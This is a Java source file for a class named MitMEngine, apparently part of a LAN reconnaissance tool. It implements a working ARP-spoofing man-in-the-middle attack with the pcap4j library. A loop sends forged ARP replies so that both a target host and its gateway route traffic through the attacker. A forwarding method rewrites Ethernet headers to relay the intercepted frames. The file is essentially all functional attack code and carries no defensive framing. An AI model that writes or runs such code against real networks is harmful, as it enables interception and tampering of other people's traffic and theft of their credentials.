package com.lanrecon;

import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.MacAddress;

import java.net.Inet4Address;
import java.net.InetAddress;

public class MitMEngine {

    private boolean active = false;
    private Thread spoofThread;
    
    public String targetIp;
    public String targetMac;
    public String gatewayIp;
    public String gatewayMac;
    
    public PcapHandle spoofHandle;
    
    private String myMac;
    private String myIp;
    private PcapNetworkInterface iface;

    public MitMEngine(PcapNetworkInterface iface, String myMac, String myIp) {
        this.iface = iface;
        this.myMac = myMac;
        this.myIp = myIp;
    }

    public boolean isActive() {
        return active;
    }

    public void setMyMac(String mac) {
        this.myMac = mac;
    }

    public void start(String targetIp, String targetMac, String gatewayIp, String gatewayMac) {
        if (active) return;
        this.active = true;
        this.targetIp = targetIp;
        this.targetMac = targetMac;
        this.gatewayIp = gatewayIp;
        this.gatewayMac = gatewayMac;
        
        System.err.println("Starting MITM Attack against: " + targetIp + " <--> " + gatewayIp);

        spoofThread = new Thread(() -> {
            try {
                this.spoofHandle = iface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
                
                MacAddress myMacAddr = MacAddress.getByName(this.myMac);
                MacAddress targetMacAddr = MacAddress.getByName(this.targetMac);
                MacAddress gatewayMacAddr = MacAddress.getByName(this.gatewayMac);
                
                Inet4Address targetIpAddr = (Inet4Address) InetAddress.getByName(this.targetIp);
                Inet4Address gatewayIpAddr = (Inet4Address) InetAddress.getByName(this.gatewayIp);

                while (active) {
                    // Poison Target: "I am the Gateway"
                    sendArpReply(spoofHandle, myMacAddr, gatewayIpAddr, targetMacAddr, targetIpAddr);
                    
                    // Poison Gateway: "I am the Target"
                    sendArpReply(spoofHandle, myMacAddr, targetIpAddr, gatewayMacAddr, gatewayIpAddr);
                    
                    Thread.sleep(1500); // 1.5 seconds between blasts
                }
                
                // Attack stopped, completely clean up ARP caches!
                System.err.println("Restoring proper ARP caches to network...");
                sendArpReply(spoofHandle, gatewayMacAddr, gatewayIpAddr, targetMacAddr, targetIpAddr);
                sendArpReply(spoofHandle, targetMacAddr, targetIpAddr, gatewayMacAddr, gatewayIpAddr);
                
                if (spoofHandle != null) {
                    spoofHandle.close();
                    spoofHandle = null;
                }
                System.err.println("MITM Engine disarmed safely.");

            } catch (Exception e) {
                System.err.println("MITM Engine Error: " + e.getMessage());
                if (spoofHandle != null) spoofHandle.close();
            }
        });
        
        spoofThread.setDaemon(true);
        spoofThread.start();
    }

    public void forwardPacket(byte[] rawFrame, String srcMacStr, String dstMacStr, String dstIpStr) {
        if (!active || spoofHandle == null || !spoofHandle.isOpen()) return;

        // Only forward packets meant for our MAC but destined for another IP
        if (!dstMacStr.equalsIgnoreCase(this.myMac) || dstIpStr.equals(this.myIp)) {
            return;
        }

        try {
            MacAddress newDstMac;
            MacAddress newSrcMac = MacAddress.getByName(this.myMac);

            // Target -> Gateway direction
            if (srcMacStr.equalsIgnoreCase(this.targetMac)) {
                newDstMac = MacAddress.getByName(this.gatewayMac);
            } 
            // Gateway -> Target direction (make sure IP matches Target IP)
            else if (srcMacStr.equalsIgnoreCase(this.gatewayMac) && dstIpStr.equals(this.targetIp)) {
                newDstMac = MacAddress.getByName(this.targetMac);
            } else {
                return; // Irrelevant traffic
            }

            // Rewrite Ethernet headers
            byte[] forwardedFrame = rawFrame.clone();
            System.arraycopy(newDstMac.getAddress(), 0, forwardedFrame, 0, 6);
            System.arraycopy(newSrcMac.getAddress(), 0, forwardedFrame, 6, 6);

            spoofHandle.sendPacket(forwardedFrame);
        } catch (Exception e) {
            // Drop silently
        }
    }

    public void stop() {
        this.active = false;
        if (spoofThread != null) {
            spoofThread.interrupt();
        }
    }

    private void sendArpReply(PcapHandle handle, MacAddress srcMac, Inet4Address srcIp, 
                              MacAddress dstMac, Inet4Address dstIp) throws Exception {
        ArpPacket.Builder arpBuilder = new ArpPacket.Builder()
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) 4)
                .operation(ArpOperation.REPLY)
                .srcHardwareAddr(srcMac)
                .srcProtocolAddr(srcIp)
                .dstHardwareAddr(dstMac)
                .dstProtocolAddr(dstIp);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder()
                .dstAddr(dstMac)
                .srcAddr(srcMac)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        handle.sendPacket(etherBuilder.build());
    }
}
